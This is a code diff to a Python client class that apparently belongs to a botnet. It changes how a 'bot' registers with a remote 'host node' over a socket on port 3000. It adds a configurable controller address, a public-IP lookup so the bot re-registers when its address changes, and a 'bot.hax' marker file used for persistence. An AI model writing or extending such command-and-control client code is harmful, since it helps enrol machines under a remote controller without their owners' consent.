@@ -1,20 +1,31 @@
-from common import common
-from common import commonio
-from bot import bot
-from common.commondefs import false
-from common.commondefs import true
 import socket
 import sys
 import os
 import threading
+import ipgetter
+from src.common import common
+from src.common import commonio
+from src.bot import bot
+from src.common.commondefs import false
+from src.common.commondefs import true
+from src.common.commondefs import none
 
 class Client:
-    def __init__(self, botRef: bot.Bot):
+    def __init__(self, botRef: bot.Bot, remoteAddr):
         self.bot = bot.Bot
-        self.hostNode = common.RemoteAddr # Set host node addr for persistency
-        self.bot.host = botRef.host # Set host for persistency
 
-        if os.path.isfile('bot.hax') == false:
+        if remoteAddr == "" or remoteAddr is none:
+            self.hostNode = common.RemoteAddr # Set host node addr for persistency
+        else:
+            self.hostNode = remoteAddr
+
+        self.bot.host = botRef.host # Set host for persistency
+        self.ip = ipgetter.myip() # Check IP
+
+        if os.path.isfile('bot.hax') == false or botRef.host != self.ip:
+            if botRef.host != self.ip: # Check for new IP
+                self.bot.host = self.ip # Register new IP
+
             self.RegisterClient() # Register client
     
     def RegisterClient(self):
@@ -32,7 +43,7 @@ class Client:
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Init socket
 
-        sock.connect((common.RemoteAddr, 3000)) # Connect socket
+        sock.connect((self.hostNode, 3000)) # Connect socket
 
         print('-- CONNECTION -- connecting to host node with bot address '+self.bot.host)
 
